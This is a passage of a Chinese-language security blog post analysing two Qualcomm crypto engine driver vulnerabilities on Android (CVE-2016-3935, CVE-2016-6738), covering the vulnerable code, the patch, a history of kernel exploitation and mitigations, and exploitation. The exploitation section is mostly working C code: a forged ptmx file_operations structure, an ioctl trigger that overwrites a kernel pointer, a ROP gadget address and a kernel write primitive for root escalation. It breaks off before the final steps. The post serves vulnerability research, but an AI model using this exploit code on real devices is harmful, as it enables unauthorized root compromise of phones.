class="number">905</span>         &#125;</span><br><span class="line"> <span class="number">906</span> </span><br><span class="line"> <span class="number">907</span>         k_src = k_buf_src;</span><br><span class="line"> <span class="number">908</span> </span><br><span class="line"> <span class="number">909</span>         <span class="comment">/* Copy data from user src(s) */</span></span><br><span class="line"> <span class="number">910</span>         user_src = (<span class="keyword">void</span> __user *)qcedev_areq-&gt;sha_op_req.data[<span class="number">0</span>].vaddr;</span><br><span class="line"> <span class="number">911</span>         <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; qcedev_areq-&gt;sha_op_req.entries; i++) &#123;</span><br><span class="line"> <span class="number">912</span>                 user_src =</span><br><span class="line"> <span class="number">913</span>                         (<span class="keyword">void</span> __user *)qcedev_areq-&gt;sha_op_req.data[i].vaddr;</span><br><span class="line"> <span class="number">914</span>                 <span class="keyword">if</span> (user_src &amp;&amp; __copy_from_user(k_src, (<span class="keyword">void</span> __user *)user_src,</span><br><span class="line"> <span class="number">915</span>                                 qcedev_areq-&gt;sha_op_req.data[i].len)) &#123;</span><br><span class="line"> <span class="number">916</span>                         kzfree(k_buf_src);</span><br><span class="line"> <span class="number">917</span>                         <span class="keyword">return</span> -EFAULT;</span><br><span class="line"> <span class="number">918</span>                 &#125;</span><br><span class="line"> <span class="number">919</span>                 k_src += qcedev_areq-&gt;sha_op_req.data[i].len;</span><br><span class="line"> <span class="number">920</span>         &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在函数 <strong>qcedev_hash_cmac</strong> 里， line 900 申请的堆内存 <strong>k_buf_src</strong> 的长度是 <strong>qcedev_areq-&gt;sha_op_req.data_len</strong> ，即请求数组里所有项的长度之和</p>
<p>然后在 line 911 ~ 920 的循环里，会将请求数组 <strong>qcedev_areq-&gt;sha_op_req.data[]</strong> 里的元素挨个拷贝到堆 <strong>k_buf_src</strong> 里，由于前面存在的整数溢出漏洞，这里会转变成为一个堆溢出漏洞，至此漏洞坐实。</p>
<h3 id="CVE-2016-3935-漏洞补丁"><a href="#CVE-2016-3935-漏洞补丁" class="headerlink" title="CVE-2016-3935 漏洞补丁 [^]"></a>CVE-2016-3935 漏洞补丁 <a href="#top">[^]</a></h3><p><span id="CVE-2016-3935-patch"></span> </p>
<p><img src="/2017/08/07/qualcomm-crypto-engine-vulnerabilities-exploits/3935patch.png" alt></p>
<p>这个 <a href="https://source.codeaurora.org/quic/la/kernel/msm-3.18/commit/?id=5f69ccf3b011c1d14a1b1b00dbaacf74307c9132" target="_blank" rel="noopener">漏洞补丁</a> 也很直观，就是在做整数溢出时，将 ULONG_MAX 改成了 U32_MAX, 这种因为系统由32位升级到64位导致的代码漏洞，是 2016 年的一类常见漏洞</p>
<p>下面进入漏洞利用分析</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用 [^]"></a>漏洞利用 <a href="#top">[^]</a></h2><h3 id="android-kernel-漏洞利用基础"><a href="#android-kernel-漏洞利用基础" class="headerlink" title="android kernel 漏洞利用基础"></a>android kernel 漏洞利用基础</h3><p>在介绍本文两个漏洞的利用之前，先回顾一下 android kernel 漏洞利用的基础知识</p>
<h4 id="什么是提权"><a href="#什么是提权" class="headerlink" title="什么是提权 [^]"></a>什么是提权 <a href="#top">[^]</a></h4><p><span id="what-is-kernel-exp"></span> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">include/linux/sched.h</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">        <span class="keyword">volatile</span> <span class="keyword">long</span> state;    <span class="comment">/* -1 unrunnable, 0 runnable, &gt;0 stopped */</span></span><br><span class="line">        <span class="keyword">void</span> *<span class="built_in">stack</span>;</span><br><span class="line">...</span><br><span class="line"><span class="comment">/* process credentials */</span></span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">real_cred</span>;</span> <span class="comment">/* objective and real subjective task</span></span><br><span class="line"><span class="comment">                                         * credentials (COW) */</span></span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">cred</span>;</span>  <span class="comment">/* effective (overridable) subjective task</span></span><br><span class="line"><span class="comment">                                         * credentials (COW) */</span></span><br><span class="line">        <span class="keyword">char</span> comm[TASK_COMM_LEN]; <span class="comment">/* executable name excluding path</span></span><br><span class="line"><span class="comment">                                     - access with [gs]et_task_comm (which lock</span></span><br><span class="line"><span class="comment">                                       it with task_lock())</span></span><br><span class="line"><span class="comment">                                     - initialized normally by setup_new_exec */</span></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>linux kernel 里，进程由 <strong>struct task_struct</strong> 表示，进程的权限由该结构体的两个成员 <strong>real_cred</strong> 和 <strong>cred</strong> 表示</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">include/linux/cred.h</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">        <span class="keyword">atomic_t</span>        usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">        <span class="keyword">atomic_t</span>        subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">        <span class="keyword">void</span>            *put_addr;</span><br><span class="line">        <span class="keyword">unsigned</span>        magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC      0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="keyword">kuid_t</span>          uid;            <span class="comment">/* real UID of the task */</span></span><br><span class="line">        <span class="keyword">kgid_t</span>          gid;            <span class="comment">/* real GID of the task */</span></span><br><span class="line">        <span class="keyword">kuid_t</span>          suid;           <span class="comment">/* saved UID of the task */</span></span><br><span class="line">        <span class="keyword">kgid_t</span>          sgid;           <span class="comment">/* saved GID of the task */</span></span><br><span class="line">        <span class="keyword">kuid_t</span>          euid;           <span class="comment">/* effective UID of the task */</span></span><br><span class="line">        <span class="keyword">kgid_t</span>          egid;           <span class="comment">/* effective GID of the task */</span></span><br><span class="line">        <span class="keyword">kuid_t</span>          fsuid;          <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">        <span class="keyword">kgid_t</span>          fsgid;          <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所谓提权，就是修改进程的 <strong>real_cred/cred</strong> 这两个结构体的各种 <strong>id</strong> 值，随着缓解措施的不断演进，完整的提权过程还需要修改其他一些内核变量的值，但是最基础的提权还是修改本进程的 cred, 这个任务又可以分解为多个问题：</p>
<ul>
<li>怎么找到目标 cred ?</li>
<li>cred 所在内存页面是否可写？</li>
<li>如何利用漏洞往 cred 所在地址写值？</li>
</ul>
<h4 id="利用方法回顾"><a href="#利用方法回顾" class="headerlink" title="利用方法回顾 [^]"></a>利用方法回顾 <a href="#top">[^]</a></h4><p><span id="android-kernel-exp"></span> </p>
<p><img src="/2017/08/07/qualcomm-crypto-engine-vulnerabilities-exploits/exphistory.png" alt></p>
<p><a href="http://powerofcommunity.net/poc2016/x82.pdf" target="_blank" rel="noopener">[图片来自]</a></p>
<p>上图是最近若干年围绕 android kernel 漏洞利用和缓解的简单回顾，</p>
<ul>
<li><p>09 ~ 10 年的时候，由于没有对 mmap 的地址范围做任何限制，应用层可以映射0页面，null pointer deref 漏洞在当时也是可以做利用的，后面针对这种漏洞推出了 <strong>mmap_min_addr</strong> 限制，目前 null pointer deref 漏洞一般只能造成 dos.  </p>
</li>
<li><p>11 ~ 13 年的时候，常用的提权套路是从 <strong>/proc/kallsyms</strong> 搜索符号 <strong>commit_creds</strong> 和 <strong>prepare_kernel_cred</strong> 的地址，然后在用户态通过这两个符号构造一个提权函数(如下)，</p>
</li>
</ul>
<pre><code><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shellcode:</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">obtain_root_privilege_by_commit_creds(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"> 		commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre><p>可以看到，这个阶段的用户态 shellcode 非常简单, 利用漏洞改写内核某个函数指针(最常见的就是 <strong>ptmx</strong> 驱动的 <strong>fsync</strong> 函数)将其实现替换为用户态的函数, 最后在用户态调用被改写的函数, 这样的话从内核直接执行用户态的提权函数完成提权</p>
<p>这种方法在开源root套件 <a href="https://github.com/android-rooting-tools/android_run_root_shell" target="_blank" rel="noopener">android_run_root_shell</a> 得到了充分提现 </p>
<p>后来，内核推出了<strong>kptr_restrict/dmesg_restrict</strong> 措施使得默认配置下无法从 <strong>/proc/kallsyms</strong> 等接口搜索内核符号的地址</p>
<p>但是这种缓解措施很容易绕过, <a href="https://github.com/android-rooting-tools/android_run_root_shell" target="_blank" rel="noopener">android_run_root_shell</a> 里提供了两种方法:</p>
<ol>
<li><p>通过一些内存 pattern 直接在内存空间里搜索符号地址，从而得到 <strong>commit_creds/prepare_kernel_cred</strong> 的值;<br><a href="https://github.com/android-rooting-tools/libkallsyms/blob/aa38ae78145724a2a330c1bab620cf3df7c3f6ad/kallsyms_in_memory.c" target="_blank" rel="noopener">libkallsyms:get_kallsyms_in_memory_addresses</a> </p>
</li>
<li><p>放弃使用 <strong>commit_creds/prepare_kernel_cred</strong> 这两个内核函数，从内核里直接定位到 <strong>task_struct 和 cred</strong> 结构并改写<br><a href="https://github.com/android-rooting-tools/android_run_root_shell/blob/master/main.c" target="_blank" rel="noopener">obtain_root_privilege_by_modify_task_cred</a> </p>
</li>
</ol>
<ul>
<li>2013 推出 text RO 和 PXN 等措施，通过漏洞改写内核代码段或者直接跳转到用户态执行用户态函数的提权方式失效了, <strong>android_run_root_shell</strong> 这个项目里的方法大部分已经失效, 在 PXN 时代，主要的提权思路是使用rop </li>
</ul>
<p>具体的 <strong>rop</strong> 技巧有几种，</p>
<ol>
<li>下面两篇文章讲了基本的 <strong>linux kernel ROP</strong> 技巧</li>
</ol>
<p><a href="https://www.trustwave.com/Resources/SpiderLabs-Blog/Linux-Kernel-ROP---Ropping-your-way-to---(Part-1)/" target="_blank" rel="noopener">Linux Kernel ROP - Ropping your way to # (Part 1)</a></p>
<p><a href="https://www.trustwave.com/Resources/SpiderLabs-Blog/Linux-Kernel-ROP---Ropping-your-way-to---(Part-2)/" target="_blank" rel="noopener">Linux Kernel ROP - Ropping your way to # (Part 2)</a></p>
<p><img src="https://npercoco.typepad.com/.a/6a0133f264aa62970b01b7c86b399a970b-800wi" alt></p>
<p>可以看到这两篇文章的方法是搜索一些 <strong>rop 指令</strong> ，然后用它们串联 <strong>commit_creds/prepare_kernel_cred</strong>, 是对上一阶段思路的自然延伸。</p>
<ol start="2">
<li><p>使用 rop 改写 <strong>addr_limit</strong> 的值，破除本进程的系统调用 <strong>access_ok</strong> 校验，然后通过一些函数如 <a href="https://github.com/hagurekamome/RootkitApp/blob/master/jni/getroot.c" target="_blank" rel="noopener">ptrace_write_value_at_address</a> 直接读写内核来提权, 将 selinux_enforcing 变量写0关闭 selinux  </p>
</li>
<li><p>大名鼎鼎的 <a href="https://www.blackhat.com/docs/eu-14/materials/eu-14-Kemerlis-Ret2dir-Deconstructing-Kernel-Isolation.pdf" target="_blank" rel="noopener">Ret2dir</a> bypass PXN</p>
</li>
<li><p>还有就是本文使用的思路，用漏洞重定向内核驱动的 <strong>xxx_operations</strong> 结构体指针到应用层，再用 rop 地址填充应用层的伪 <strong>xxx_operations</strong> 里的函数实现</p>
</li>
<li><p>还有一些 2017 新出来的绕过缓解措施的技巧，<a href="http://powerofcommunity.net/poc2016/x82.pdf" target="_blank" rel="noopener">参考</a></p>
</li>
</ol>
<ul>
<li>进入2017年，更多的漏洞缓解措施正在被开发和引进，谷歌的nick正在主导开发的项目 <a href="https://kernsec.org/wiki/index.php/Kernel_Self_Protection_Project/Work" target="_blank" rel="noopener">Kernel_Self_Protection_Project</a> 对内核漏洞提权方法进行了分类整理，如下</li>
</ul>
<ul>
<li><a href="https://kernsec.org/wiki/index.php/Exploit_Methods/Kernel_location" target="_blank" rel="noopener">Kernel location</a></li>
<li><a href="https://kernsec.org/wiki/index.php/Exploit_Methods/Text_overwrite" target="_blank" rel="noopener">Text overwrite</a></li>
<li><a href="https://kernsec.org/wiki/index.php/Exploit_Methods/Function_pointer_overwrite" target="_blank" rel="noopener">Function pointer overwrite</a></li>
<li><a href="https://kernsec.org/wiki/index.php/Exploit_Methods/Userspace_execution" target="_blank" rel="noopener">Userspace execution</a></li>
<li><a href="https://kernsec.org/wiki/index.php/Exploit_Methods/Userspace_data_usage" target="_blank" rel="noopener">Userspace data usage</a></li>
<li><a href="https://kernsec.org/wiki/index.php/Exploit_Methods/Reused_code_chunks" target="_blank" rel="noopener">Reused code chunks</a></li>
</ul>
<p>针对以上提权方法，<a href="https://kernsec.org/wiki/index.php/Kernel_Self_Protection_Project/Work" target="_blank" rel="noopener">Kernel_Self_Protection_Project</a> 开发了对应的一系列缓解措施，目前这些措施正在逐步推入<strong>linux kernel</strong> 主线，下面是其中一部分缓解方案，可以看到，我们回顾的所有利用方法都已经被考虑在内，不久的将来，这些方法可能都会失效</p>
<ul>
<li>Split thread_info off of kernel stack (Done: x86, arm64, s390. Needed on arm, powerpc and others?) * Move kernel stack to vmap area (Done: x86, s390. Needed on arm, arm64, powerpc and others?)</li>
<li>Implement kernel relocation and KASLR for ARM</li>
<li>Write a plugin to clear struct padding</li>
<li>Write a plugin to do format string warnings correctly (gcc’s -Wformat-security is bad about const strings)</li>
<li>Make CONFIG_STRICT_KERNEL_RWX and CONFIG_STRICT_MODULE_RWX mandatory (done for arm64 and x86, other archs still need it)</li>
<li>Convert remaining BPF JITs to eBPF JIT (with blinding) (In progress: arm)</li>
<li>Write lib/test_bpf.c tests for eBPF constant blinding</li>
<li>Further restriction of perf_event_open (e.g. perf_event_paranoid=3)</li>
<li>Extend HARDENED_USERCOPY to use slab whitelisting (in progress)</li>
<li>Extend HARDENED_USERCOPY to split user-facing malloc()s and in-kernel malloc()svmalloc stack guard pages (in progress)</li>
<li>protect ARM vector table as fixed-location kernel target</li>
<li>disable kuser helpers on arm</li>
<li>rename CONFIG_DEBUG_LIST better and default=y</li>
<li>add WARN path for page-spanning usercopy checks (instead of the separate CONFIG)</li>
<li>create UNEXPECTED(), like BUG() but without the lock-busting, etc</li>
<li>create defconfig “make” target for by-default hardened Kconfigs (using guidelines below)</li>
<li>provide mechanism to check for ro_after_init memory areas, and reject structures not marked ro_after_init in vmbus_register()</li>
<li>expand use of __ro_after_init, especially in arch/arm64</li>
<li>Add stack-frame walking to usercopy implementations (Done: x86. In progress: arm64. Needed on arm, others?)</li>
<li>restrict autoloading of kernel modules (like GRKERNSEC_MODHARDEN) (In progress: Timgad LSM)</li>
</ul>
<p>有兴趣的同学可以进入该项目看看代码，提前了解一下缓解措施，</p>
<p>比如 <code>KASLR for ARM</code>, 将大部分内核对象的地址做了随机化处理，这是以后 android kernel exploit 必须面对的; </p>
<p>另外比如 <code>__ro_after_init</code> ，内核启动完成初始化之后大部分 <strong>fops</strong> 全局变量都变成 readonly 的，这造成了本文这种利用方法失效, 所幸的是，目前 android kernel 还是可以用的。</p>
<h4 id="本文使用的利用方法"><a href="#本文使用的利用方法" class="headerlink" title="本文使用的利用方法 [^]"></a>本文使用的利用方法 <a href="#top">[^]</a></h4><p><span id="this-kernel-exp"></span> </p>
<p>对照 <a href="https://kernsec.org/wiki/index.php/Kernel_Self_Protection_Project/Work" target="_blank" rel="noopener">Kernel_Self_Protection_Project</a> 的利用分类，本文的利用思路属于 <a href="https://kernsec.org/wiki/index.php/Exploit_Methods/Userspace_data_usage" target="_blank" rel="noopener">Userspace data usage</a></p>
<blockquote>
<p>Sometimes an attacker won’t be able to control the instruction pointer directly, but they will be able to redirect the dereference a structure or other pointer. In these cases, it is easiest to aim at malicious structures that have been built in userspace to perform the exploitation.</p>
</blockquote>
<p>具体来说，我们在应用层构造一个伪 <strong>file_operations</strong> 结构体(其他如 <strong>tty_operations</strong> 也可以)，然后通过漏洞改写内核某一个驱动的 <strong>fops</strong> 指针，将其改指向我们在应用层伪造的结构体，之后，我们搜索特定的 rop 并随时替换这个伪 <strong>file_operations</strong> 结构体里的函数实现，就可以做到在内核多次执行任意代码（取决于rop) ，这种方法的好处包括：</p>
<ol>
<li>内核有很多驱动，所以 fops 非常多，地址上也比较分散，对一些溢出类漏洞来说，选择比较多</li>
<li>内核的 fops 一般都存放在 writable 的 data 区，至少目前android 主流 kernel 依然如此</li>
<li>将内核的 fops 指向用户空间后，用户空间可以随意改写其内部函数的实现</li>
<li>只需要一次内核写</li>
</ol>
<p>下面结合漏洞说明怎么利用</p>
<h3 id="CVE-2016-6738-漏洞利用"><a href="#CVE-2016-6738-漏洞利用" class="headerlink" title="CVE-2016-6738 漏洞利用 [^]"></a>CVE-2016-6738 漏洞利用 <a href="#top">[^]</a></h3><p><span id="CVE-2016-6738-exp"></span> </p>
<p>CVE-2016-6738 是一个任意地址写任意值的漏洞，利用代码已经提交在 <a href="https://github.com/453483289/android_vuln_poc-exp/tree/master/EXP-CVE-2016-6738" target="_blank" rel="noopener">EXP-CVE-2016-6738</a></p>
<p>我们选择重定向 /dev/ptmx 设备的 file_operations, 先在用户态构造一个伪结构，如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">map</span> = mmap(<span class="number">0x1000000</span>, (<span class="keyword">size_t</span>)<span class="number">0x10000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">-1</span>, (<span class="keyword">off_t</span>)<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">map</span> == MAP_FAILED) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[-] Failed to mmap landing (%d-%s)\n"</span>, errno, strerror(errno));</span><br><span class="line">        ret = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//printf("[+] landing mmap'ed @ %p\n", map);</span></span><br><span class="line"><span class="built_in">memset</span>(<span class="built_in">map</span>, <span class="number">0x0</span>, <span class="number">0x10000</span>);</span><br><span class="line">fake_ptmx_fops = <span class="built_in">map</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] fake_ptmx_fops = 0x%lx\n"</span>,fake_ptmx_fops);</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">1</span> * <span class="number">8</span>) = PTMX_LLSEEK;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">2</span> * <span class="number">8</span>) = PTMX_READ;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">3</span> * <span class="number">8</span>) = PTMX_WRITE;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">8</span> * <span class="number">8</span>) = PTMX_POLL;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">9</span> * <span class="number">8</span>) = PTMX_IOCTL;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">10</span> * <span class="number">8</span>) = COMPAT_PTMX_IOCTL;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">12</span> * <span class="number">8</span>) = PTMX_OPEN;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">14</span> * <span class="number">8</span>) = PTMX_RELEASE;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">17</span> * <span class="number">8</span>) = PTMX_FASYNC;</span><br></pre></td></tr></table></figure>

<p>根据前面的分析，伪结构的值需要先做一次加密，再使用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> edata = <span class="number">0</span>;</span><br><span class="line">       qcedev_encrypt(fd, fake_ptmx_fops, &amp;edata);</span><br><span class="line">       trigger(fd, edata);</span><br></pre></td></tr></table></figure>

<p>下面是核心的函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">trigger</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> cmd;</span><br><span class="line">        <span class="keyword">int</span> ret;</span><br><span class="line">        <span class="keyword">int</span> <span class="built_in">size</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> dst;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">qcedev_cipher_op_req</span> <span class="title">params</span>;</span></span><br><span class="line"></span><br><span class="line">        dst = PTMX_MISC + <span class="number">8</span> * <span class="number">9</span>; <span class="comment">// patch ptmx_cdev-&gt;ops</span></span><br><span class="line">        <span class="built_in">size</span> = <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line">        <span class="built_in">memset</span>(&amp;params, <span class="number">0</span>, <span class="keyword">sizeof</span>(params));</span><br><span class="line">        cmd = QCEDEV_IOCTL_DEC_REQ;</span><br><span class="line">        params.entries = <span class="number">1</span>;</span><br><span class="line">        params.in_place_op = <span class="number">1</span>; <span class="comment">// bypass access_ok check of creq-&gt;vbuf.dst[i].vaddr</span></span><br><span class="line">        params.alg = QCEDEV_ALG_DES;</span><br><span class="line">        params.mode = QCEDEV_DES_MODE_ECB;</span><br><span class="line">        params.data_len = <span class="built_in">size</span>;</span><br><span class="line">        params.vbuf.src[<span class="number">0</span>].len = <span class="built_in">size</span>;</span><br><span class="line">        params.vbuf.src[<span class="number">0</span>].vaddr = &amp;src;</span><br><span class="line">        params.vbuf.dst[<span class="number">0</span>].len = <span class="built_in">size</span>;</span><br><span class="line">        params.vbuf.dst[<span class="number">0</span>].vaddr = dst;</span><br><span class="line">        <span class="built_in">memcpy</span>(params.enckey,<span class="string">"test"</span>, <span class="number">16</span>);</span><br><span class="line">        params.encklen = <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[+] overwrite ptmx_cdev ops\n"</span>);</span><br><span class="line">        ret = ioctl(fd, cmd, &amp;params); <span class="comment">// trigger </span></span><br><span class="line">        <span class="keyword">if</span>(ret == <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"[-] Ioctl qcedev fail(%s - %d)\n"</span>, strerror(errno), errno);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参数 src 就是 <strong>fake_ptmx_fops</strong> 加密后的值，我们将其地址放入 <strong>qcedev_cipher_op_req.vbuf.src[0].vaddr</strong> 里，目标地址 <strong>qcedev_cipher_op_req.vbuf.dst[0].vaddr</strong> 存放 <strong>ptmx_cdev-&gt;ops</strong> 的地址，然后调用 ioctl 触发漏洞，任意地址写漏洞触发后，目标地址 <strong>ptmx_cdev-&gt;ops</strong> 的值会被覆盖为 <strong>fake_ptmx_fops</strong>.</p>
<p>此后，对 ptmx 设备的内核fops函数执行，都会被重定向到用户层伪造的函数，我们通过一些rop 片段来实现伪函数，就可以被内核直接调用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * rop write:</span></span><br><span class="line"><span class="comment"> * ffffffc000671a58:       b9000041        str     w1, [x2]</span></span><br><span class="line"><span class="comment"> * ffffffc000671a5c:       d65f03c0        ret</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROP_WRITE       0xffffffc000671a58</span></span><br></pre></td></tr></table></figure>

<p>比如，我们找到一段 rop 如上，其地址是 0xffffffc000671a58， 其指令是 str w1, [x2] ; ret ;</p>
<p>这段 rop 作为一个函数去执行的话，其效果相当于将第二个参数的值写入第三个参数指向的地址。</p>
<p>我们用这段 rop 构造一个用户态函数，如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">kernel_write_32</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> arg;</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">9</span> * <span class="number">8</span>) = ROP_WRITE;</span><br><span class="line"></span><br><span class="line">        arg = addr;</span><br><span class="line">        ioctl_syscall(__NR_ioctl, ptmx_fd, val, arg);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>9*8 是 ioctl 函数在 file_operations 结构体里的偏移，</p>
<p> <code>*(unsigned long*)(fake_ptmx_fops + 9 * 8) = ROP_WRITE;</code></p>
<p>的效果就是 ioctl 的函数实现替换成 <strong>ROP_WRITE</strong>, 这样我们调用 ptmx 的 ioctl 函数时，最后真实执行的是 <strong>ROP_WRITE</strong>, 这就是一个内核任意地址写任意值函数。</p>
<p>同样的原理，我们封装读任意内核地址的函数。</p>
<p>有了任意内核地址读写函数之后，我们通过以下方法完成最终提权：</p>
